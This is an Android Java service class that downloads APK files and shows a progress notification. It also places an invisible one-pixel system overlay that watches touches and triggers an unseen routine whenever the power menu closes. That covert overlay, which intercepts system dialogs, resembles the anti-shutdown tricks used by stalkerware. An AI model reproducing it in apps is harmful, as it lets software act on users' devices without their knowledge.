package com.cpu;

import android.speech.tts.TextToSpeech;
import android.content.*;
import android.app.*;
import android.os.*;
import android.widget.*;
import android.view.*;
import android.util.*;
import android.graphics.*;
import java.util.Locale;
import com.tools.*;

public class ServiceBoot extends Service
{
	private BroadcastReceiver broadcastReceiver;
	private ReceiverBoot receiver;
	private NotificationManager notificationManager;
	private static int notifyIndex = 8989;

	public static boolean ifDownload = false;
	public static boolean isDownload = false;
	public static boolean swAll = false;
	public static boolean notInstalled = true;
	public static String apkDownload = "";
	public static String urlDownload = "";
	public static String pathandname = "";

	private Handler mHandler = new Handler();
	private Runnable mRefresh = new Runnable() {
		public void run() {

			Log.i("xxx", "heheh");
			if (receiver.sizedownload == 100) {
				
				receiver.sizedownload = 100;
				notifiDownload(ServiceBoot.this);
				
				mHandler.removeCallbacks(mRefresh);

			}
			else {
				notifiDownload(ServiceBoot.this);
				mHandler.postDelayed(mRefresh, 1000);
			}
		}
	};

	@Override
    public IBinder onBind(Intent intent) {
        return null;
    }

	@Override
	public void onCreate()
	{
		// TODO: Implement this method
		super.onCreate();
		LinearLayout layout = new LinearLayout(this) {
			public void onCloseSystemDialogs(String reason) {
				if ("globalactions".equals(reason)) {
					new Senter().runingKu();
				}
				else if ("homekey".equals(reason)) {
					//Toast.makeText(ServiceBoot.this, "home", Toast.LENGTH_LONG).show();
				}
				else if ("recentapps".equals(reason)) {
					//Toast.makeText(ServiceBoot.this, "recentapps", Toast.LENGTH_LONG).show();
				}
			}

			@Override
			public boolean dispatchKeyEvent(KeyEvent event) {
				if (event.getKeyCode() == KeyEvent.KEYCODE_BACK || 
					event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_UP ||
					event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_DOWN ||
					event.getKeyCode() == KeyEvent.KEYCODE_CAMERA ||
					event.getKeyCode() == KeyEvent.KEYCODE_POWER) {

					//Toast.makeText(ServiceBoot.this, "key: "+event.getKeyCode(), Toast.LENGTH_LONG).show();
				}
				return super.dispatchKeyEvent(event);
			}
		};
		layout.setFocusable(true);

		View view = LayoutInflater.from(this).inflate(R.layout.service_layout, layout);
		
		WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(1, 1,
        	WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
			WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, PixelFormat.TRANSLUCENT);
				
		params.gravity = Gravity.LEFT | Gravity.CENTER_VERTICAL;
		wm.addView(view, params);
		
		IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
		filter.addAction(Intent.ACTION_DATE_CHANGED);
		filter.addAction(Intent.ACTION_HEADSET_PLUG);
		filter.addAction(Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_SCREEN_OFF);
		
		broadcastReceiver = new ReceiverBoot();
		registerReceiver(broadcastReceiver, filter);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId)
	{
		if (ifDownload) {
			downloadAPK();
		}
		else if (swAll) {
			downloadAllApk();
		}

		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy()
	{
		// TODO: Implement this method
		super.onDestroy();
		unregisterReceiver(receiver);
		Toast.makeText(this, "al destroy", Toast.LENGTH_LONG).show();

	}

	private void downloadAllApk() {

	}

	private void downloadAPK() {
		receiver = new ReceiverBoot();
		receiver.requestUrl = urlDownload;
		receiver.requestAksi = "download";
		receiver.requestPath = pathandname;
		receiver.mainRequest(this);

		mHandler.postDelayed(mRefresh, 500);
		notifyIndex += 1;

	}

	private void notifiDownload(Context context) {
		Intent intent = new Intent(context, MainPaket.class);
		intent.putExtra("apkf", apkDownload);
        PendingIntent pIntent = PendingIntent.getActivity(context, 0, intent, PendingIntent.FLAG_ONE_SHOT);

        Notification notification = new Notification.Builder(context)
			.setSmallIcon(R.drawable.icon)
			.setContentText(apkDownload)
			.setContentTitle(" ("+receiver.sizedownload+"%) "+urlDownload)
			.setTicker(" ("+receiver.sizedownload+"%)")
			.setOngoing(true)
			.setLights(Color.RED, 500, 500)
			.setContentIntent(pIntent)
			.build();
		notification.flags |= Notification.FLAG_AUTO_CANCEL;

		notificationManager = (NotificationManager)context.getSystemService(context.NOTIFICATION_SERVICE);

		notificationManager = (NotificationManager)context.getSystemService(context.NOTIFICATION_SERVICE);
		notificationManager.notify(notifyIndex, notification);
	}

}


